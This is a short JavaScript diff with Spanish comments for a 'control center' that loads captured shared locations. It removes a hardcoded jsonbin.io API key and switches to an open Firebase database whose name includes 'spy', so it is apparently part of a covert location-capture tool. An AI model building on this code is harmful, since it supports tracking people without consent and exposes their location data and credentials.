@@ -1,11 +1,5 @@
 // Script para integrar base de datos compartida en el centro de control
 function initSharedDatabase() {
-    const binId = '674658a6e41b4d34e45a8712';
-    const apiKey = '$2b$10$/wQJxV8Iw/W3NCZjXEqmMugvDaHq0bUE3Zd.aL7RBGksfGI49n79S';
-    
-    // Sobrescribir función refreshCaptures para usar base de datos compartida
-    window.originalRefreshCaptures = window.refreshCaptures;
-    
     // Sobrescribir función refreshCaptures para usar base de datos compartida
     window.originalRefreshCaptures = window.refreshCaptures;
     
@@ -13,11 +7,10 @@ function initSharedDatabase() {
         const container = document.getElementById('capturedList');
         container.innerHTML = '<p style="color: #95a5a6; text-align: center; padding: 20px;">🔄 Cargando ubicaciones compartidas...</p>';
         
-        // Cargar desde base de datos compartida
-        fetch(`https://api.jsonbin.io/v3/b/${binId}`, {
+        // Cargar desde Firebase
+        fetch('https://goodviv-spy-default-rtdb.firebaseio.com/locations.json', {
             method: 'GET',
             headers: {
-                'X-Master-Key': apiKey,
                 'Content-Type': 'application/json'
             }
         })
